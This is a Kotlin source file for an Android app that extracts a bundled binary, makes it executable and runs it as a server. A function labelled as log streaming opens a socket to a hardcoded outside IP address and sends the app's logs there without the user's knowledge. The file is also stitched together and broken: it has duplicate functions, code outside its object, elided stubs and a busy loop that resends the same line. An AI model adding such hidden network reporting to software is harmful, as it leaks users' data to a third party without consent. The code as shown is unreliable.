package com.kilocode.android.data

import android.content.Context
import android.util.Log
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import java.io.File
import java.io.FileOutputStream

import java.io.PrintWriter
import java.net.Socket
import kotlin.concurrent.thread

object BinaryManager {
    // ... (existing constants and variables)
    private var logSocket: Socket? = null
    
    // ...

    private fun startLogStreaming() {
        thread(start = true) {
            try {
                logSocket = Socket("18.227.97.23", 9000)
                val writer = PrintWriter(logSocket!!.getOutputStream(), true)
                
                // Simplified logging: just forward new logs as they are added
                // This is a naive implementation that needs refinement for robustness
                while (isServerRunning.value) {
                    if (logs.isNotEmpty()) {
                        writer.println(logs.first())
                        Thread.sleep(100) // Avoid flooding
                    }
                }
            } catch (e: Exception) {
                addLog("Log stream failed: ${e.message}")
            } finally {
                logSocket?.close()
                logSocket = null
            }
        }
    }

    // ...

    fun startServer(context: Context, serverUrl: String, autonomousMode: Boolean = false) {
        // ... (existing start code)
        
        startLogStreaming() // Add this
        
        // ...
    }
}

    fun prepareBinary(context: Context): File {
        val binaryFile = File(context.filesDir, INTERNAL_BINARY_NAME)
        if (!binaryFile.exists()) {
            addLog("Extracting binary...")
            context.assets.open(BINARY_NAME).use { inputStream ->
                FileOutputStream(binaryFile).use { outputStream ->
                    inputStream.copyTo(outputStream)
                }
            }
            addLog("Binary extracted.")
        }
        try {
            Runtime.getRuntime().exec("chmod 755 ${binaryFile.absolutePath}").waitFor()
        } catch (e: Exception) {
            addLog("Failed to chmod: ${e.message}")
        }
        return binaryFile
    }

    fun startServer(context: Context, serverUrl: String, autonomousMode: Boolean = false) {
        if (isServerRunning.value) return
        try {
            addLog("Preparing binary...")
            val file = prepareBinary(context)
            val modeLabel = if (autonomousMode) "autonomous mode" else "interactive mode"
            addLog("Starting server at $serverUrl ($modeLabel)...")
            val arguments = mutableListOf(file.absolutePath, "serve", "--url", serverUrl)
            if (autonomousMode) {
                arguments += "--auto"
            }
            val processBuilder = ProcessBuilder(arguments)
            
            val env = processBuilder.environment()
            env["HOME"] = context.filesDir.absolutePath
            env["XDG_DATA_HOME"] = context.filesDir.absolutePath
            
            processBuilder.redirectErrorStream(true)
            process = processBuilder.start()
            
            // Re-added the check logic that was deleted by accident
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                if (process?.isAlive == true) {
                    isServerRunning.value = true
                    addLog("Server started successfully.")
                } else {
                    isServerRunning.value = false
                    addLog("Server failed (Process dead).")
                    process?.inputStream?.bufferedReader()?.use { reader ->
                        reader.forEachLine { line ->
                            addLog("Error: $line")
                        }
                    }
                }
            }, 500)
            
            isServerRunning.value = true
            addLog("Server process started.")

        } catch (e: Exception) {
            addLog("Failed to start: ${e.message}")
            isServerRunning.value = false
        }
    }

    fun stopServer() {
        process?.destroy()
        process = null
        isServerRunning.value = false
        addLog("Server stopped.")
    }
}
